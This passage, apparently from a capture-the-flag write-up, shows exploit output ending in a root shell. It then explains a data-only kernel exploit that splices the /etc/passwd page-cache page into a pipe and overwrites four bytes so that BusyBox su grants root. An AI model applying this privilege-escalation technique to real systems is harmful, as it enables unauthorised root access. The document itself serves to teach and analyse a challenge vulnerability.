[*] preparing write offset 35 inside the stashed page
[*] splicing /etc/passwd page at file offset 0x0
[*] stashing page-cache page pointer
[*] drained pipe reference; page_copy should now have refcount 1
[*] preparing write offset 37 inside the stashed page
~ # id
uid=0(root) gid=1337(user) groups=1337(user)
~ # cat /root/flag
TEST_FLAG
```

## Important limitations and assumptions

This exploit is tailored to this challenge environment.

The assumptions are:

1. `/etc/passwd` is readable by the unprivileged user.
2. The current user has a 4-digit UID.
3. The current user's passwd line is on a page where the target offsets are not at the very beginning or last 3 bytes of the page.
4. BusyBox `su` is setuid root.
5. BusyBox `su` accepts the empty passwd field cashout in this initramfs.
6. The vulnerable kernel copies and trusts a userspace-provided `struct iov_iter` with the Linux 7.0.3 layout used here.

The exploit does not need:

- KASLR bypass
- SMEP bypass
- SMAP bypass
- kernel stack leak
- ROP
- `commit_creds`
- `modprobe_path`

It is a data-only exploit against trusted file content in the page cache.

## Why the exploit is stable

The stable part is that it avoids racing the page allocator.

The unstable approach would be:

1. Stash anonymous pipe page.
2. Drain it.
3. Hope `/etc/passwd` page cache reuses the same physical page.

The final approach is deterministic:

1. Put the actual `/etc/passwd` page-cache page into a pipe with `splice()`.
2. Stash that page.
3. Drain the pipe to satisfy the refcount check.
4. Write into the already-known destination page.

That is why the exploit worked reliably in QEMU.

## Final vulnerable primitive in one sentence

The challenge accidentally exposes:

```text
copy 4 attacker-controlled bytes from userspace into an attacker-selected page-cache page at an attacker-controlled offset
```

where:

- selected page comes from `splice("/etc/passwd" -> pipe)` plus `F_INIT_PAGE`
- selected offset comes from the length of a separate control pipe buffer
- selected bytes come from a forged `ITER_UBUF` `iov_iter`

That primitive is enough to corrupt `/etc/passwd` in page cache and turn the current user into root for `su`.
